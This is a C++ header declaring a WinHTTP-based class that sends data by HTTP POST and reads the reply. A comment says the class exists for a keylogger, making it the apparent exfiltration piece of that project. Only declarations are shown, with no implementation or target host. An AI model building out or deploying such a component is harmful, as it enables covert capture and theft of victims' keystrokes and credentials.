#pragma once
#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>
#include <string>
#pragma comment(lib, "Winhttp.lib")

/*
A class to handle the sending of HTTP POST requests and the receiving of responses
*/

class RequestSender
{
public:
	// to be used by KeyLogger. Calls all methods in required order.
	void sendDataAcross(char* dataToSend, int outputSize);

private:
	// store result of WinHttpOpen, used in WinHttpConnect
	HINTERNET currSession;
	// store result of WinHttpConnect, used in WinHttpOpenRequest
	HINTERNET currConnection;
	// store result of WinHttpOpenRequest, used in WinHttpSendRequest
	HINTERNET currRequest;
	// record if send was successful
	bool stepSuccessful;

	// initializes WinHTTP by calling WinHttpOpen, returning a session handle and storing it in currSession
	void createSession();
	// specify http server to connect to using WinHttpConnect
	void connToServer();
	// open HTTP request, returns a HINTERNET handle to request to send and storing it in currRequest
	void openRequest();
	// uses WinHttpSendRequest to connect to server and send request to site- in our case this is a POST request
	void sendRequest(char* dataToSend, int outputSize);
	// prepare request handle to receive via WinHttpReceiveResponse and download resource with ReadData (read available data) & QueryDataAvailable (how much data to download)
	void receiveResponse();
	// close any open handles using WinHttpCloseHandle
	void closeHandles();
};